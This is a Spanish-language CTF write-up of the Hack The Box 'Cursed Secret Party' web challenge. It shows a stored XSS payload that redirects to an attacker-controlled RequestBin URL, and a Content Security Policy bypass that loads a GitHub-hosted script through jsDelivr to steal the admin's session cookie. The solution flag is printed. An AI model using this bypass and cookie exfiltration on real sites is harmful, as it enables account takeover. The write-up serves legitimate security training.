---
title: Hack The Boo 2022 - Cursed Secret Party
layout: post
description: La resolución del reto "Cursed Secret Party" del CTF "Hack The Boo 2022" organizado por Hack The Box.
tags:
- HackTheBox
- CursedSecretParty
- ctf
- post
- writeups
---
# Descripción
---

You've just received an invitation to a party. Authorities have reported that the party is cursed, and the guests are trapped in a never-ending unsolvable murder mystery party. Can you investigate further and try to save everyone?

# Solución
---

El quinto y último reto web del CTF nos presenta con un formulario muy bonito.

![](/images/images-hacktheboo2022/csp-1.png)

Al rellenar el cuestionario y enviarlo vemos un mensaje que nos habla sobre un equipo que revisará nuestra petición, esto me hace pensar inmediatamente en un XSS. Ingresamos datos a través de un formulario y una persona ve ese formulario, si logramos inyectar javascript malicioso en un formulario la persona que lea ese formulario quedará infectada y así podremos obtener la flag.

![](/images/images-hacktheboo2022/csp-2.png)

Voy a usar [RequestBin](https://requestbin.com/) para recibir las peticiones que provocaremos con el XSS, obtenemos la url para crear nuestro payload.


![](/images/images-hacktheboo2022/csp-3.png)

Copiamos y pegamos nuestro payload con el fin de ver una petición en nuestro servidor de RequestBin.

```javascript
<script>document.location="https://eo3emfo3s2pmmn3.m.pipedream.net"</script>
```

![](/images/images-hacktheboo2022/csp-5.png)

Pero no llega nada.

![](/images/images-hacktheboo2022/csp-6.png)

Revisando el código fuente vemos que se está usando el CSP, el Content Security Policy sirve para agregar seguridad extra a una aplicación y evitar los XSS.

![](/images/images-hacktheboo2022/csp-7.png)

Googleando por un rato nos encontramos con esta página de github donde nos enseñan formas de bypassear el CSP [Link](https://github.com/qazbnm456/awesome-security-trivia/blob/master/Ways-to-bypass-CSP.md). Nos habla sobre el uso inseguro de CDNs, en una de esas CDNs inseguras está jsDelivr, y anteriormente vimos que se está usando jsDelivr.

![](/images/images-hacktheboo2022/csp-4.png)

Según la página nosotros podemos ejecutar cualquier archivo javascript a través de la CDN y en esta CDN existe la opción de cargar archivos desde github, así que nuestro objetivo será cargar un archivo javascript malicioso alojado en github y desde ahí realizar una petición al exterior.

![](/images/images-hacktheboo2022/csp-8.png)

Analizando el código fuente vemos que el usuario al que atacaremos será el admin y en su cookie estará la flag, este es nuestro objetivo final, la cookie del usuario admin.

![](/images/images-hacktheboo2022/csp-9.png)

Como primer paso creamos un repositorio de github.

![](/images/images-hacktheboo2022/csp-10.png)

Como segundo paso creamos nuestro exploit, hacemos click en el botón `creating a new file` para hacerlo más rápido.

![](/images/images-hacktheboo2022/csp-13.png)

Le ponemos nombre con la extensión `.js` y escribimos nuestro payload.

![](/images/images-hacktheboo2022/csp-14.png)

Guardamos nuestro archivo.

![](/images/images-hacktheboo2022/csp-15.png)

Según jsdelivr nuestro link debe verse así:

```javascript
https://cdn.jsdelivr.net/gh/user/repo@version/file
```

Después de rellenar los datos se ve así:

```javascript
https://cdn.jsdelivr.net/gh/kaniehuest/exploit/xss.js
```

Construimos nuestor exploit y queda así:

```javascript
<script src="https://cdn.jsdelivr.net/gh/kaniehuest/exploit/xss.js"></script>
```

![](/images/images-hacktheboo2022/csp-16.png)

Vamos a nuestra página de RequestBin y observamos una petición por el método POST.

![](/images/images-hacktheboo2022/csp-17.png)

En el body podemos ver una cookie de sesión JWT.

![](/images/images-hacktheboo2022/csp-18.png)

Si copiamos el valor de la cookie y la pegamos en [jwt.io](https://jwt.io/) obtenemos la flag en la pestaña de payload. Un último hint del reto son las inicales de cada palabra Cursed Secret Party forman **CSP** Content Security Policy.

![](/images/images-hacktheboo2022/csp-19.png)

# Flag
---

`HTB{cdn_c4n_byp4ss_c5p!!}`
